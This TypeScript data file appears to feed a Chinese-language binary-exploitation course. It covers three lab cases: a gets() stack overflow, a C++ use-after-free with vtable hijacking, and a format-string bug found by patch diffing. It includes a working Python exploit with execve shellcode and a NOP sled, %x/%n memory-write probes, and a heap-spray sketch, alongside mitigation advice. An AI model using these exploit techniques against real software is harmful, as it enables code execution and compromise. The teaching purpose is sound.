export interface CaseData {
  id: string;
  title: string;
  difficulty: '新手' | '进阶';
  vulnType: string;
  description: string;
  knowledge: string[];
  downloadUrl: string;
  overview: string;
  analysisSteps: {
    title: string;
    content: string;
    code?: {
      code: string;
      language: 'c' | 'cpp' | 'python' | 'javascript' | 'bash' | 'asm' | 'plaintext';
      title?: string;
      highlightLines?: number[];
    };
  }[];
  protection: string[];
  expectedResult: string;
  relatedSteps: { label: string; href: string }[];
}

export const cases: CaseData[] = [
  {
    id: 'stack-buffer-overflow',
    title: '栈缓冲区溢出 - 经典 gets() 漏洞',
    difficulty: '新手',
    vulnType: 'CWE-120 缓冲区溢出',
    description:
      '一个最经典的栈溢出入门案例：程序使用 gets() 读取用户输入到固定大小的栈缓冲区中，没有边界检查，导致可以覆盖返回地址控制程序流。',
    knowledge: ['栈帧结构', '危险函数识别', '返回地址覆盖', 'Shellcode 基础'],
    downloadUrl: 'https://github.com/bininsight/cases/releases/download/v1.0/stack-overflow.zip',
    overview:
      '本案例目标程序 vuln1 是一个简单的 C 程序，它使用 gets() 函数从标准输入读取数据到栈上的字符数组中。由于 gets() 不检查缓冲区边界，当输入长度超过缓冲区大小时，会覆盖栈上的返回地址，从而控制程序执行流。这是学习栈溢出最经典的入门案例。',
    analysisSteps: [
      {
        title: '定位危险函数',
        content:
          '使用反汇编工具（如 Ghidra 或 objdump）查看目标程序的 main 函数，识别其中对 gets() 的调用。gets() 是一个已知的危险函数，因为它无法限制读取的长度。',
        code: {
          code: `// 反编译后的 vuln1 主函数（简化）
#include <stdio.h>

void vulnerable_function() {
    char buffer[64];   // 64 字节栈缓冲区
    printf("Enter your name: ");
    gets(buffer);      // 危险：无边界检查
    printf("Hello, %s!\\n", buffer);
}

int main() {
    vulnerable_function();
    return 0;
}`,
          language: 'c',
          title: 'vuln1.c - 反编译结果',
          highlightLines: [6, 8],
        },
      },
      {
        title: '确认路径可达',
        content:
          '分析调用链：main → vulnerable_function → gets。用户输入直接流入 gets()，路径完全可达。计算缓冲区到返回地址的偏移量：buffer[64] + 保存的 ebp(4 或 8 字节) = 偏移 72 或 80 字节处即为返回地址。',
        code: {
          code: `# 使用 pattern 创建工具计算偏移
$ python3 -c "print('A'*72 + 'BBBB')" | ./vuln1
Enter your name: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBB!
Segmentation fault (core dumped)

# 检查崩溃时的 EIP/RIP
$ gdb -q ./vuln1
(gdb) run < <(python3 -c "print('A'*72 + 'BBBB')")
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()   # EIP = 0x42424242 = "BBBB"`,
          language: 'bash',
          title: '计算返回地址偏移',
        },
      },
      {
        title: '漏洞验证',
        content:
          '确认可以精确控制返回地址后，构造完整的 exploit：填充字节 + 覆盖返回地址为 shellcode 地址 + NOP sled + shellcode。在关闭 ASLR 和 NX 的环境下验证可获取 shell。',
        code: {
          code: `# 简单 exploit 示例（关闭 NX/ASLR 环境）
import struct

buffer_size = 72
# 返回地址指向 NOP sled 中间
ret_addr = struct.pack('<I', 0xbffff7c0)

# NOP sled + shellcode + padding + return address
nop_sled = b'\\x90' * 32
shellcode = b'\\x31\\xc0\\x50\\x68//sh\\x68/bin\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80'
padding = b'A' * (buffer_size - len(nop_sled) - len(shellcode))

payload = nop_sled + shellcode + padding + ret_addr

with open('payload.bin', 'wb') as f:
    f.write(payload)

print("Payload generated:", len(payload), "bytes")`,
          language: 'python',
          title: 'exploit.py - 栈溢出利用脚本',
          highlightLines: [11],
        },
      },
    ],
    protection: [
      '使用安全的输入函数替代 gets()，如 fgets() 并指定最大读取长度',
      '启用编译器栈保护选项：-fstack-protector-strong（Stack Canary）',
      '启用 NX（Data Execution Prevention）使栈不可执行',
      '启用 ASLR（地址空间布局随机化）',
      '代码审查中重点检查 gets、strcpy、sprintf 等无边界检查函数',
    ],
    expectedResult:
      '运行 Mutagen 扫描应检测到 CWE-120 缓冲区溢出漏洞，定位到 gets() 调用行，漏洞严重等级为 Critical。自动修复建议应将 gets() 替换为 fgets() 并正确设置缓冲区大小。在关闭保护机制的环境中，手工构造的 exploit 应能成功控制程序执行流并弹出 shell。',
    relatedSteps: [
      { label: 'Step 2 · 静态分析', href: '/learn/step2' },
      { label: 'Step 3 · 路径探索', href: '/learn/step3' },
      { label: 'Step 4 · 防护策略', href: '/learn/step4' },
    ],
  },
  {
    id: 'use-after-free',
    title: 'UAF（Use-After-Free）- C++ 虚表劫持',
    difficulty: '进阶',
    vulnType: 'CWE-416 释放后重用',
    description:
      '一个 C++ 程序中的 Use-After-Free 漏洞：对象被释放后指针未置空，后续代码仍然通过该指针调用虚函数，攻击者可以控制释放后的内存内容来劫持虚表指针。',
    knowledge: ['堆内存管理', 'C++ 虚函数机制', 'UAF 原理', '虚表劫持', 'Heap Spraying'],
    downloadUrl: 'https://github.com/bininsight/cases/releases/download/v1.0/use-after-free.zip',
    overview:
      '本案例目标程序 vuln2 是一个 C++ 程序，包含一个基类 Base 和两个派生类。程序存在一个典型的 UAF 模式：对象被 delete 后，指针没有被置为 nullptr，在后续逻辑中又通过该指针调用了虚函数。攻击者可以在对象释放后、再次使用前，用可控数据填充被释放的内存块，从而篡改虚表指针（vptr），控制程序执行流。',
    analysisSteps: [
      {
        title: '定位危险函数',
        content:
          '分析 C++ 程序的类继承关系和虚函数表结构。定位到对象释放后仍被使用的代码路径，识别 UAF 漏洞点。重点关注 delete 之后是否还有指针解引用操作。',
        code: {
          code: `// UAF 漏洞示例（简化）
class Base {
public:
    virtual void process() { /* ... */ }
};

class Derived : public Base {
public:
    void process() override { /* ... */ }
};

void uaf_demo() {
    Base* obj = new Derived();
    obj->process();   // 正常调用

    delete obj;       // 释放对象，但 obj 未置空
    // ... 中间有其他逻辑 ...
    obj->process();   // UAF：通过悬挂指针调用虚函数
}`,
          language: 'cpp',
          title: 'vuln2.cpp - UAF 漏洞点',
          highlightLines: [14, 16],
        },
      },
      {
        title: '确认路径可达',
        content:
          '追踪对象生命周期：new → 使用 → delete → 再次使用。确认在 delete 和再次使用之间，程序有分配其他内存的机会（如 malloc/new），这使得攻击者有机会通过堆喷射控制被释放的内存。',
        code: {
          code: `# 用 gdb 跟踪对象生命周期
(gdb) break uaf_demo
(gdb) run
Breakpoint 1, uaf_demo () at vuln2.cpp:10

# 查看 new 后的对象地址
(gdb) next
(gdb) print obj
$1 = (Base *) 0x55555556aeb0

# 查看虚表指针
(gdb) print *(void**)obj
$2 = (void *) 0x555555557d00 <vtable for Derived+16>

# delete 后查看内存是否被释放
(gdb) next
(gdb) print *(void**)obj
$3 = (void *) 0x0     # 内存可能已被清零或归还堆管理器`,
          language: 'bash',
          title: 'GDB 跟踪 UAF 对象',
        },
      },
      {
        title: '漏洞验证',
        content:
          '构造堆喷射（Heap Spraying）：在 delete 之后、第二次调用虚函数之前，分配大量包含伪造虚表的内存块。如果这些内存块占据了原对象的地址，那么第二次调用虚函数时就会跳转到攻击者控制的地址。',
        code: {
          code: `// 利用思路：堆喷射 + 虚表劫持
// 1. 触发 delete obj
// 2. 分配大量填充了伪造虚表的内存块
// 3. 再次调用 obj->process() 时，vptr 指向伪造的虚表

void exploit_uaf() {
    // 触发 UAF
    trigger_uaf_and_free();

    // 堆喷射：分配大量内存，包含伪造的 vtable
    for (int i = 0; i < 1000; i++) {
        FakeVtableObj* fake = new FakeVtableObj();
        // fake->vtable[0] 指向 gadget 或 shellcode 地址
        fake->set_vtable(target_gadget);
        spray_pool.push_back(fake);
    }

    // 触发第二次调用 -> 劫持控制流
    trigger_use_after_free();
}`,
          language: 'cpp',
          title: 'UAF 利用原理示意',
          highlightLines: [10, 13],
        },
      },
    ],
    protection: [
      '释放对象后立即将指针置为 nullptr（智能指针可自动处理）',
      '使用 std::unique_ptr / std::shared_ptr 管理内存，避免手动 delete',
      '启用 CFI（Control Flow Integrity）保护，限制虚函数调用目标',
      '使用地址消毒器（AddressSanitizer）在开发阶段检测 UAF',
      '启用堆随机化和安全堆元数据校验',
    ],
    expectedResult:
      '运行 Mutagen 扫描应检测到 CWE-416 Use-After-Free 漏洞，定位到第二次调用虚函数的代码行，漏洞严重等级为 High。在 Ghidra 中应能清晰看到虚表指针（vptr）在对象内存布局中的位置。在关闭保护的环境中，通过堆喷射可稳定劫持控制流。',
    relatedSteps: [
      { label: 'Step 2 · 静态分析', href: '/learn/step2' },
      { label: 'Step 3 · 路径探索', href: '/learn/step3' },
      { label: 'Step 4 · 防护策略', href: '/learn/step4' },
    ],
  },
  {
    id: 'patch-diff',
    title: '补丁比对 - 同一漏洞的修复前后对比',
    difficulty: '进阶',
    vulnType: '补丁分析 / 二进制差异',
    description:
      '通过比对同一程序的漏洞版本和修复版本，学习如何从二进制补丁中反向定位漏洞点，理解常见的修复模式，训练补丁差异分析能力。',
    knowledge: ['二进制差分', '补丁反向工程', '修复模式识别', '函数级对比', '基本块对比'],
    downloadUrl: 'https://github.com/bininsight/cases/releases/download/v1.0/patch-diff.zip',
    overview:
      '本案例提供同一程序的两个版本：vuln3_old（存在漏洞）和 vuln3_new（已修复）。目标是通过二进制对比找出修复了什么漏洞、修复方式是什么、以及原始漏洞的利用面。这是实战中非常重要的技能——安全研究者常常通过补丁比对来发现未公开的漏洞细节。案例使用了一个格式化字符串漏洞作为修复对象。',
    analysisSteps: [
      {
        title: '函数级差异定位',
        content:
          '使用二进制对比工具（如 Diaphora 或 Ghidra 的版本对比）对两个版本进行函数级匹配，找出发生变化的函数。变化的函数很可能就是漏洞修复的位置。',
        code: {
          code: `# 使用 Diaphora 进行二进制对比
$ python3 diaphora.py vuln3_old vuln3_new

[+] Loading first binary...
[+] Loading second binary...
[+] Matching functions...
[+] Results:
    BEST MATCH: printf_user (0x401186 -> 0x4011a2) [SCORE: 0.72]
    BEST MATCH: main (0x401210 -> 0x401230) [SCORE: 0.95]
    BEST MATCH: init (0x401150 -> 0x401150) [SCORE: 1.00]
    PARTIAL: process_input (0x401186 -> 0x4011b8) [SCORE: 0.68]

[!] Function 'process_input' has significant changes - likely patched`,
          language: 'bash',
          title: 'Diaphora 函数级对比结果',
          highlightLines: [10, 13],
        },
      },
      {
        title: '基本块级对比',
        content:
          '进入变化的函数，对比修复前后的控制流图和指令差异。分析新增了哪些检查、替换了哪些函数调用，推断修复的漏洞类型。',
        code: {
          code: `// 修复前：vuln3_old - process_input 函数
void process_input(char *input) {
    char buf[128];
    strncpy(buf, input, 127);
    printf(buf);           // 格式化字符串漏洞
}

// 修复后：vuln3_new - process_input 函数
void process_input(char *input) {
    char buf[128];
    strncpy(buf, input, 127);
    printf("%s", buf);     // 修复：使用格式字符串常量
}`,
          language: 'c',
          title: '修复前后对比 - 格式化字符串漏洞',
          highlightLines: [4, 11],
        },
      },
      {
        title: '漏洞验证与分析',
        content:
          '确认漏洞类型为 CWE-134 格式化字符串漏洞。验证原始版本中可以通过 %x、%n 等格式符读取和写入内存。分析修复方式：将用户输入从格式字符串参数位置移到了 %s 的参数位置，这是格式化字符串漏洞的标准修复模式。',
        code: {
          code: `# 验证格式化字符串漏洞
$ echo "AAAA%x.%x.%x.%x" | ./vuln3_old
AAAA41414141.78252e78.78252e78.78252e78
# 输出中包含 "41414141" = "AAAA"，说明可以控制栈上数据

# 使用 %n 写入
$ python3 -c "print('%64x%n' + p32(0x0804a010))" | ./vuln3_old
# 可以向指定地址写入数值

# 修复版本验证
$ echo "AAAA%x.%x.%x.%x" | ./vuln3_new
AAAA%x.%x.%x.%x
# 直接输出字面量，漏洞已修复`,
          language: 'bash',
          title: '验证格式化字符串漏洞',
          highlightLines: [2, 3, 11],
        },
      },
    ],
    protection: [
      '永远不要将用户可控数据作为 printf 系列函数的格式字符串参数',
      '使用编译器警告 -Wformat-security 检测不安全的格式化字符串使用',
      '代码审查中重点检查 printf、sprintf、fprintf 等函数的第一个参数是否可控',
      '使用静态分析工具（如 Coverity、CodeQL）自动检测格式化字符串漏洞',
      '对用户输入进行严格的过滤和白名单校验',
    ],
    expectedResult:
      '通过二进制补丁比对，应能定位到 process_input 函数中的 printf 调用变化，识别出从 printf(buf) 到 printf(\"%s\", buf) 的修复模式。运行 Mutagen 扫描旧版本应检测到 CWE-134 格式化字符串漏洞，扫描新版本则不应报告该漏洞。这验证了修复的有效性。',
    relatedSteps: [
      { label: 'Step 2 · 静态分析', href: '/learn/step2' },
      { label: 'Step 4 · 防护策略', href: '/learn/step4' },
    ],
  },
];

export function getCaseById(id: string): CaseData | undefined {
  return cases.find((c) => c.id === id);
}
